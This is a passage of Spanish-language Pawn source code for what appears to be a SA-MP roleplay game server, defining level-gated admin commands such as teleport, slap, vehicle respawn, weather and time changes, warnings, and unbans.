			new string[128];
			format(string, sizeof(string), "Respawn general realizado por %s.", PlayerName(playerid));
			BroadCast(COLOR_VERDE, string);
        } else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		return 1;
		}

command(rsinuso, playerid, params[]){
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No puedes utilizar este comando!");
	if(!booleano[AntiAbusos]{playerid}){
	Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
	else{
		MensajeGlobal(COLOR_VERDE, "* Todos los vehículos sin uso fueron respawneados.");
		if(cuenta[playerid][cAdministrador] > 3){
			new bool:unwanted[MAX_VEHICLES];
			for(new i=0; i<MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i)){
					if(IsPlayerInAnyVehicle(i))
						unwanted[GetPlayerVehicleID(i)] = true;
				}
			}
			for(new car=0; car<MAX_VEHICLES; car++)
			{
				spawnAuto(!unwanted[car] ? (car) : (0));
			}
		}
	}
	return 1;
}
	
 	command(reautomatico, playerid, params[])
	{
        if(cuenta[playerid][cAdministrador] < 5)return Mensaje(playerid, COLOR_GRIS1, "Necesitar ser Administrador Nivel 5!");
		
			new string[210];
			if(Conteo != 0)return Mensaje(playerid, COLOR_GRIS, "* ERROR: Ya hay un respawn de vehiculos en progreso!");
			ValorConteo = 45, Conteo = 1;
			TimerConteo = SetTimer("AjustarTextDraw", 1000, true);
   			new nombre[MAX_PLAYER_NAME];
			GetPlayerName(playerid, nombre, sizeof(nombre));
			format(string, sizeof(string), "{FFFFFF}AdminWarn:{006FFF} %s inició un respawn de vehículos sin uso, móntese en sus vehículos para no ser respawneado.", nombre);
			MensajeGlobal(-1, string);
			return 1;
	}
    command(ir, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "u", params[0])){
		    if(params[0] != INVALID_PLAYER_ID){
		        new Float:p_x, Float:p_y, Float:p_z;
		        GetPlayerPos(params[0], p_x, p_y, p_z);
		        new interior = GetPlayerInterior(params[0]);
          		SetPosEx(playerid, p_x, p_y, p_z, 0, interior, 0);
          		return Mensaje(playerid, COLOR_GRIS3, "Teleportado!");
		    } else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /ir <PlayerID>");
        return 1;
    }
    command(activar, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!ActiveTeleport[playerid]){
        	ActiveTeleport[playerid] = 1;
        	Mensaje(playerid, COLOR_GRIS2, "Teleport Activado!");
		}
		else if(ActiveTeleport[playerid]){
		    ActiveTeleport[playerid] = 0;
		    Mensaje(playerid, COLOR_GRIS2, "Teleport Desactivado!");
  		}
		return 1;
 	}
    command(traer, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        new player;
		if(!sscanf(params, "u", player)){
			if(player != INVALID_PLAYER_ID){
			if(booleano[npcUse]{player})return Mensaje(playerid, COLOR_GRIS1, "Este usuario esta interactuando con un NPC.");
			if(cuenta[player][cCarcel] == 3)return Mensaje(playerid, COLOR_GRIS1, "Este jugador esta en JAIL IC.");
				
				new Float:p_x, Float:p_y, Float:p_z;
		        GetPlayerPos(playerid, p_x, p_y, p_z);
		        new interior = GetPlayerInterior(playerid);
          		SetPosEx(player, p_x, p_y, p_z, 0, interior, 0);
          		
				new string[144];
				format(string, sizeof(string), "* Usted fue llevado a la posicion de %s.", PlayerName(playerid));
				Mensaje(player, COLOR_GRAD4, string);
				
		    } else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /traer <PlayerID>");
        return 1;
    }
    command(alimpiar, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        CleanScreen();
        new string[48];
		format(string, sizeof(string), "Limpieza de chat por %s.", PlayerName(playerid));
		return MensajeGlobal(COLOR_VERDE, string);
    }
    command(bigears, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 3)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if (!booleano[BigEar]{playerid}){
            booleano[BigEar]{playerid} = true;
			return Mensaje(playerid, COLOR_GRIS2, "BigEars Mode On");
		}
		else{
			booleano[BigEar]{playerid} = false;
			return Mensaje(playerid, COLOR_GRIS2, "BigEars Mode Off");
		}
    }
    command(slap, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "u", params[0])){
			new Float:slx, Float:sly, Float:slz, string[52];
			if(params[0] != INVALID_PLAYER_ID){
			if(booleano[npcUse]{params[0]})return Mensaje(playerid, COLOR_GRIS1, "Este usuario esta interactuando con un NPC.");
			    GetPlayerPos(params[0], slx, sly, slz);
				SetPlayerPos(params[0], slx, sly, slz+5);
				PlayerPlaySound(params[0], 1130, slx, sly, slz+5);
				format(string, sizeof(string), "%s golpeó a %s", PlayerName(playerid), PlayerName(params[0]));
				AdminMensaje(string);
				return Mensaje(params[0], COLOR_ROJO, string);
			} else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /slap <PlayerID>");
        return 1;
    }
    command(irmarca, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 3)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if (GetPlayerState(playerid) == 2)
		{
			new tmpcar = GetPlayerVehicleID(playerid);
			SetVehiclePosEx(tmpcar, TeleportDest[playerid][0], TeleportDest[playerid][1], TeleportDest[playerid][2]);
		}
		else
		{
			SetPlayerPos(playerid, TeleportDest[playerid][0], TeleportDest[playerid][1], TeleportDest[playerid][2]);
		}
		return Mensaje(playerid, COLOR_GRIS1, "Teleportado!");
    }
    command(marcar, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 3)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        GetPlayerPos(playerid, TeleportDest[playerid][0], TeleportDest[playerid][1], TeleportDest[playerid][2]);
		return Mensaje(playerid, COLOR_GRIS1, "Posición guardada!");
    }
    command(fixveh, playerid, params[])
	{
    	if(!booleano[AntiAbusos]{playerid})
		{
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(cuenta[playerid][cAdministrador] > 4)
        {
            if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, -1, "»{FFFFFF} No estás en un vehículo.");
            SetVehicleHealth(GetPlayerVehicleID(playerid), 1000.0);
    		RepairVehicle(GetPlayerVehicleID(playerid));
    		new idcar = GetPlayerVehicleID(playerid);
    		if(EsComprable(idcar)) 
			{
				autos[idcar][cBattery] = 10000;
				Gas[idcar] = 1000;
			}
    		Mensaje(playerid, COLOR_GRIS2, "Vehículo fixeado!");
		} else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		return 1;
	}
 	command(explode, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 5)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "u", params[0])){
		    new string[64];
		    new Float:boomx, Float:boomy, Float:boomz;
			GetPlayerPos(params[0], boomx, boomy, boomz);
			CreateExplosion(boomx, boomy , boomz, 7, 10);
		    format(string, sizeof(string), "%s fue explotado por %s", PlayerName(params[0]), PlayerName(playerid)); AdminMensaje(string);
			return Mensaje(params[0], COLOR_ROJO, string);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /explode <ID>");
        return 1;
    }
	
COMMAND:mascara(playerid, params[])
{
	if(!cuenta[playerid][cMascara])return Mensaje(playerid, COLOR_GRIS2, "No tienes máscara!");
	new string[64];
	if(!Maskuse[playerid])
	{
		for(new i=0, t=GetMaxPlayers();i<t;i++)
		{
			if(IsPlayerConnected(i) && !cuenta[i][cAdministrador])
			{
				PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
				SetPlayerAttachedObject(playerid, 1, 19036, 2, 0.1, 0.017, 0.0, 90.0, 90.0, 0.0, 1.1, 1.1, 1.1);
				ShowPlayerNameTagForPlayer(i, playerid, false);
			}
		}
		Maskuse[playerid] = 1;
		format(string, sizeof(string), "* %s se pone una máscara.", PlayerName(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	}
	else
	{
		for(new i=0, t=GetMaxPlayers();i<t;i++)
		{
			if(IsPlayerConnected(i) && !cuenta[i][cAdministrador])
			{
				ShowPlayerNameTagForPlayer(i, playerid, true);
			}
		}
		Maskuse[playerid] = 0;
		for(new x;x<MAX_PLAYERTOYS;x++) RemovePlayerAttachedObject(playerid, x);
		format(string, sizeof(string), "* %s se quita la máscara de su rostro.", PlayerName(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	}
	return 1;
}
COMMAND:clima(playerid, params[])
{
	new climaid, string[144];
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(cuenta[playerid][cAdministrador] >= 2013)
	if(sscanf(params, "d", climaid))return Mensaje(playerid, COLOR_GRIS2, "Use /clima [climaid]");
	if(climaid < 0 || climaid > 20)
	{
		Mensaje(playerid, COLOR_ROJO, "0 = MUY SOLEADO LOS SANTOS");
		Mensaje(playerid, COLOR_ROJO, "1 = SOLEADO LOS SANTOS");
		Mensaje(playerid, COLOR_ROJO, "2 = MUY SOLEADO CON NIEBLA");
		Mensaje(playerid, COLOR_ROJO, "3 = SOLEADO CON NIEBLA");
		Mensaje(playerid, COLOR_ROJO, "4 = NUBLADO LOS SANTOS");
		Mensaje(playerid, COLOR_ROJO, "5 = SOLEADO SAN FIERRO");
		Mensaje(playerid, COLOR_ROJO, "6 = MUY SOLEADO SAN FIERRO");
		Mensaje(playerid, COLOR_ROJO, "7 = NUBLADO SAN FIERRO");
		Mensaje(playerid, COLOR_ROJO, "8 = LLUVIA SAN FIERRO");
		Mensaje(playerid, COLOR_ROJO, "9 = NIEBLA SAN FIERRO");
		Mensaje(playerid, COLOR_ROJO, "10 = SOLEADO LAS VENTURAS");
		Mensaje(playerid, COLOR_ROJO, "11 = MUY SOLEADO LAS VENTURAS");
		Mensaje(playerid, COLOR_ROJO, "12 = NUBLADO LAS VENTURAS");
		Mensaje(playerid, COLOR_ROJO, "13 = MUY SOLEADO CAMPO");
		Mensaje(playerid, COLOR_ROJO, "14 = SOLEADO CAMPO");
		Mensaje(playerid, COLOR_ROJO, "15 = NUBLADO CAMPO");
		Mensaje(playerid, COLOR_ROJO, "16 = LLUVIA CAMPO");
		Mensaje(playerid, COLOR_ROJO, "17 = MUY SOLEADO DESERTICO");
		Mensaje(playerid, COLOR_ROJO, "18 = SOLEADO DESERTICO");
		Mensaje(playerid, COLOR_ROJO, "19 = TORMENTA DESERTICA");
		Mensaje(playerid, COLOR_ROJO, "20 = BAJO EL AGUA");
		return 1;
	}

	format(string, sizeof string, "El administrador %s cambio el clima.", PlayerName(playerid), params[0]);
	AdminMensaje(string);

	SetWeather(climaid);
	DefaultWeather = (climaid);
	return 1;
}
	
    command(tod, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "i", params[0])){
			new string[48];
		    SetWorldTime(params[0]);
		    format(string, 256, "%s cambió la hora a %d", PlayerName(playerid), params[0]);
			return AdminMensaje(string);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /tod <Time> No usar este comando sin razón.");
        return 1;
    }
    command(dararma, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "uii", params[0], params[1], params[2])){
		    if(params[1] < 1 || params[1] > 46)return Mensaje(playerid, COLOR_GRIS2, "Error ID. (1-46)");
		    if(params[2] > 9999)return Mensaje(playerid, COLOR_GRIS2, "Error Ammo. (Máx: 9999)");
		    new string[128];
		    darArma(params[0], params[1], params[2]);
			format(string, 128, "Administrador %s dió a %s Arma: %d Balas: %d", PlayerName(playerid), PlayerName(params[0]), params[1], params[2]);
			return MensajeAdmin(-1, string, 2014);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /dararma <PlayerID> <WeaponID> <Ammo> (Ver armas en /ARMAS)");
        return 1;
    }
    command(teleports, playerid, params[]){
    if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
    if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
       	Mensaje(playerid, 0xFF6464FF, "-= Teleports =-");
       	Mensaje(playerid, COLOR_GRIS2, "/ls /sf /lv /conse /conse2 /banco /taller /groove /yakuza /jefferson /telectronica /unity");
	    return 1;
    }
    command(ah, playerid, params[]){
    	if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(Admin(1, playerid)){
		    Mensaje(playerid, COLOR_LIMA, "-= Comandos Nivel 1 =-");
			Mensaje(playerid, COLOR_GRIS2, "/kick /kickname /verarmas /harmas /check /setint /setvw /silenciar /advertir /togw");
			Mensaje(playerid, COLOR_GRIS2, "/ccadmin /sp /spoff /congelar /descongelar /jaileados /teleports /astrips /ir /traer /tkick");
			Mensaje(playerid, COLOR_ROJO, "Leer /consejosayudante");
		}
		if(Admin(2, playerid))
		{
		    Mensaje(playerid, 0x93FF93FF, "-= Comandos Nivel 2 =-");
			Mensaje(playerid, COLOR_GRIS2, "/alimpiar /desarmar /slap /setskin /rtcar /carid /sethp /setarmor /activar");
			Mensaje(playerid, COLOR_GRIS2, "/jail /jailoff /quemarcosecha /togac /unjail");
			Mensaje(playerid, COLOR_GRIS2, "/rsfacciones [Respawn de autos SIN USO de facciones]");
			Mensaje(playerid, COLOR_GRIS2, "/rsrenta [Respawn de autos SIN USO de renta]");
			Mensaje(playerid, COLOR_GRIS2, "/rsjobs [Respawn de autos SIN USO de trabajos]");
		}
		if(Admin(3, playerid)){
		    Mensaje(playerid, 0xFFA579FF, "-= Comandos Nivel 3 =-");
			Mensaje(playerid, COLOR_GRIS2, "/getcar /qb /qbs /bigears /gotocar");
		}
		if(Admin(4, playerid)){
		    Mensaje(playerid, 0xFF8040FF, "-= Comandos Nivel 4 =-");
			Mensaje(playerid, COLOR_GRIS2, "/puntorol /tban /unbanip /banduda /unbanduda /aengineon");
			Mensaje(playerid, COLOR_GRIS2, "/unban [PARA USUARIOS QUE APELEN EN FORO]");
		}
		if(Admin(5, playerid)){
		    Mensaje(playerid, 0xFFA579FF, "-= Comandos Nivel 5 =-");
			Mensaje(playerid, COLOR_GRIS2, "/explode /llenarautos /fixveh /verip /aooc /reautomatico");
		}
		if(Admin(6, playerid)){
			Mensaje(playerid, 0xFF8040FF, "-= Comandos Nivel 6 =-");
			Mensaje(playerid, COLOR_GRIS2, "/changeit /aseguro /removerpublicidad");
		}
		if(Admin(2012, playerid)){
			Mensaje(playerid, 0xFF4A4AFF, "-= Comandos Nivel 2012 =-");
			Mensaje(playerid, COLOR_GRIS2, "Comandos de familias: /setfamilia");
			Mensaje(playerid, COLOR_GRIS2, "/unban /house /houseint /bizz /liberar /darlider /estadoemergencia (quitar)");
		}
		if(Admin(2013, playerid)){
            Mensaje(playerid, 0xFF4A4AFF, "-= Comandos Nivel 2013 =-");
            Mensaje(playerid, COLOR_GRIS2, "/daradmin /noac /staff /mps /listaspec /noduda /clima /setstat");
			Mensaje(playerid, COLOR_GRIS, "[*] /crearfaccion: {FFFFFF}Crea una Faccion Oficial");
			Mensaje(playerid, COLOR_GRIS, "[*] /listafaccion: {FFFFFF}Visualiza las facciones {008000}DISPONIBLES");
			Mensaje(playerid, COLOR_GRIS, "[*] /efaccion: {FFFFFF}Elimina una faccion Oficial completamente");
			Mensaje(playerid, COLOR_GRIS, "[*] /hqboveda: {FFFFFF}Crea una Boveda para una Faccion Ilegal y/o moverla");
			Mensaje(playerid, COLOR_GRIS, "[*] /hqmover: {FFFFFF}Crea un Territorio para la Faccion Ilegal");
			Mensaje(playerid, COLOR_GRIS, "[*] /colorid: {FFFFFF}Muestra los colores disponibles para los territorios");
			Mensaje(playerid, COLOR_GRIS, "[*] /zonacolor: {FFFFFF}Cambia el color de un territorio");
			Mensaje(playerid, COLOR_GRIS, "[*] /borrarautofacc: {FFFFFF}Borra el auto de una faccion, id con /dl");
			Mensaje(playerid, COLOR_GRIS, "[*] /editarautofacc: {FFFFFF}Cambia el Color y la posicion de spawn de un auto de faccion");
        }
        if(Admin(2014, playerid)){
            Mensaje(playerid, 0xFF4A4AFF, "-= Comandos Dueño =-");
            Mensaje(playerid, COLOR_GRIS2, "/casas /rcn /dararma /dardinero /darmoneda /fijardinero /removerbizz /bizzentrada");
			Mensaje(playerid, COLOR_GRIS2, "/entradacasa /removercasa /houseentrance /houseint /loteria /rsinuso");
			Mensaje(playerid, COLOR_GRIS2, "/tod /forzarsubsidio /asellhouse /asellbizz");
        }
        return 1;
    }
    command(unbanip, playerid, params[])
    {
    	if(cuenta[playerid][cAdministrador] < 4)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
    	if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "s[32]", params[0]))
        {
            new string[90];
            format(string, sizeof(string), "unbanip %s", params[0]);
            SendRconCommand(string);
			SendRconCommand("reloadbans");
			format(string, sizeof(string), "IP desbaneada por %s (%s)", PlayerName(playerid), params[0]);
			AdminMensaje(string);
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /unbanip <IP>");
        return 1;
    }
    command(clickplayer, playerid, params[])
    {
        if (cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS, "No autorizado!");
		if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(sscanf(params, "i", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /ClickPlayer <0-1>");
        if(sscanf(params, "i", params[0]))return Mensaje(playerid, COLOR_GRIS2, "0.- Spectear 1.- Ir");
        if(params[0] > -1 && params[0] < 3)
        {
        	SelectClick[playerid] = params[0];
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /ClickPlayer <0-1>");
		return 1;
    }
    command(banduda, playerid, params[]){
		if (cuenta[playerid][cAdministrador] < 4)return Mensaje(playerid, COLOR_GRIS, "No autorizado!");
		if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "us[64]", params[0], params[1])){
           if(IsPlayerConnected(params[0])){
                new string[128];
                format(string, sizeof(string), "%s ha baneado del sistema de ayuda a %s, razón: %s", PlayerName(playerid), PlayerName(params[0]), params[1]);
                AdminMensaje(string);
                cuenta[params[0]][cBanDuda] = 1;
                Mensaje(params[0], COLOR_BLANCO, "  Atención<------");
                Mensaje(params[0], COLOR_GRIS2, "*Usted ha sido bloqueado de usar el sistema de ayuda - Contacte con un Administrador.");
            } else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /banduda <PlayerID> <Razón>");
        return 1;
    }
    command(unbanduda, playerid, params[]){
		if (cuenta[playerid][cAdministrador] < 4)return Mensaje(playerid, COLOR_GRIS, "No autorizado!");
		if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "u", params[0])){
            if(IsPlayerConnected(params[0])){
                new string[128];
		        format(string, sizeof(string), "%s ha desbaneado del sistema de ayuda a %s", PlayerName(playerid), PlayerName(params[0]));
				AdminMensaje(string);
                cuenta[params[0]][cBanDuda] = 0;
				Mensaje(params[0], -1, "{00DC84}------>{FFFFFF}Atención{00DC84}<------");
				Mensaje(params[0], COLOR_GRIS2, "*Usted ha sido desbloqueado de usar el sistema de ayuda.");
            } else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /unbanduda <PlayerID>");
        return 1;
    }
    command(advertir, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        new jugador, razon[128];
        if(!sscanf(params, "us[128]", jugador, razon))
		{
            if(IsPlayerConnected(jugador))
			{
                new string[128];
                cuenta[jugador][cAdvertencias] += 1;
				format(string, sizeof(string), "%s ha dado una advertencia a %s, razón: %s", PlayerName(playerid), PlayerName(jugador), razon);
                Mensaje(jugador, COLOR_ROJO, string);
				AdminMensaje(string);
				if(cuenta[jugador][cAdvertencias] >= 3)
				{
				    format(string, sizeof(string), "%s fue baneado automaticamente por tener mas de 2 advertencias", PlayerName(jugador));
				    AdminMensaje(string);
					Mensaje(jugador, COLOR_BLANCO, "-----> Atención <------");
					Mensaje(jugador, COLOR_GRIS2, "Fuiste baneado automaticamente del servidor por acumular mas de 2 advertencias, toma una ScreenShot");
					Mensaje(jugador, COLOR_GRIS2, "ahora mismo oprimiendo F8 asi podras apelar tu desban via foro o contacta con un administrador via msn.");
					
					ban(jugador, "Limite de advertencias", Nombre(playerid), "Ninguno");
				}
				else
				{
					Mensaje(jugador, COLOR_BLANCO, "* Has recibido una advertencia y has sido kikeado, cuando llegues a 3 advertencias seras baneado.");
					Kick(jugador);
				}
			}else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		}else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /advertir <PlayerID> <Razon>");
		return 1;
    }
    command(advertencia, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "us[164]", params[0], params[1])){
            if(IsPlayerConnected(params[0])){
                new string[164];
                if(cuenta[params[0]][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "Ese jugador no pertenece al staff!");
                cuenta[params[0]][cAdminAdvertencia] += 1;
				format(string, sizeof(string), "%s ha dado una advertencia administrativa a %s, razón: %s", PlayerName(playerid), PlayerName(params[0]), params[1]);
				AdminMensaje(string);
				if(cuenta[params[0]][cAdminAdvertencia] >= 3)
				{
				    cuenta[params[0]][cAdministrador] = 0;
				    format(string, sizeof(string), "%s fue expulsado automaticamente del staff por acumular 3 advertencias", PlayerName(params[0]));
                    Mensaje(params[0], COLOR_ROJO, string);
					AdminMensaje(string);
					cuenta[params[0]][cAdminAdvertencia] = 0;
				}
				else{
				    format(string, sizeof(string), "* Has recibido una advertencia administrativa por parte de %s", PlayerName(playerid));
				    Mensaje(params[0], COLOR_BLANCO, string);
				}
			} else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /advertencia <AdminID> <Razon>");
		return 1;
    }
    command(checkadver, playerid, params[0])
    {
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "u", params[0])){
			if(IsPlayerConnected(params[0])){
				new string[128];
			    if(cuenta[params[0]][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "Ese usuario no pertenece al staff!");
				format(string, sizeof(string), "Administrador: %s   -   Advertencias: %d", PlayerName(params[0]), cuenta[params[0]][cAdminAdvertencia]);
				Mensaje(playerid, COLOR_GRAD4, string);
			} else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /checkadver <PlayerID>");
        return 1;
    }
    command(editadver, playerid, params[0])
    {
        if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "ud", params[0], params[1])){
            if(IsPlayerConnected(params[0])){
                new string[128];
                cuenta[params[0]][cAdminAdvertencia] = params[1];
                format(string, sizeof(string), "%s ha establecido en %d las advertencias administrativas de %s", PlayerName(playerid), params[1], PlayerName(params[0]));
				AdminMensaje(string);
			} else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /editadver <PlayerID> <Advertencias>");
        return 1;
    }
    command(noduda, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if (!nod){
			nod = 1;
			MensajeGlobal(COLOR_AMARILLO3, "  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -");
			MensajeGlobal(COLOR_ROJO, "  *** Canal de Dudas Desactivado ***  ");
			return MensajeGlobal(COLOR_AMARILLO3, "  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -");
		}
		else{
			nod = 0;
			MensajeGlobal(COLOR_AMARILLO3, "  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -");
			MensajeGlobal(COLOR_VERDE, "  *** Canal de Dudas Activado (/duda) ***   ");
			MensajeGlobal(COLOR_NEWS, "  ... No Flood & No Spam ... ");
			return MensajeGlobal(COLOR_AMARILLO3, "  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -");
		}
    }
command(diosmio, playerid, params[]){
	if(IsPlayerAdmin(playerid)){
		if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
			booleano[AntiAbusos]{playerid} = true;
			booleano[AdminDuty]{playerid} = true;
			booleano[HidePM]{playerid} = false;
			AdminChat[playerid] = 0;
			
			darArmadura(playerid, 2000.0);
			SetHP(playerid, 2000.0);
			Mensaje(playerid, COLOR_GRIS2, "Ahora ya podras usar todos los comandos administrativos.");
		}else return Mensaje(playerid, COLOR_GRIS1, "No autorizado");
	return 1;
}

command(diosmio2, playerid, params[]){
	if(IsPlayerAdmin(playerid)){
		if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
			booleano[AntiAbusos]{playerid} = false;
			booleano[AdminDuty]{playerid} = false;
  		
		
			Mensaje(playerid, COLOR_GRIS2, "Te sacaste el admin duty.");
		}else return Mensaje(playerid, COLOR_GRIS1, "No autorizado");
	return 1;
}
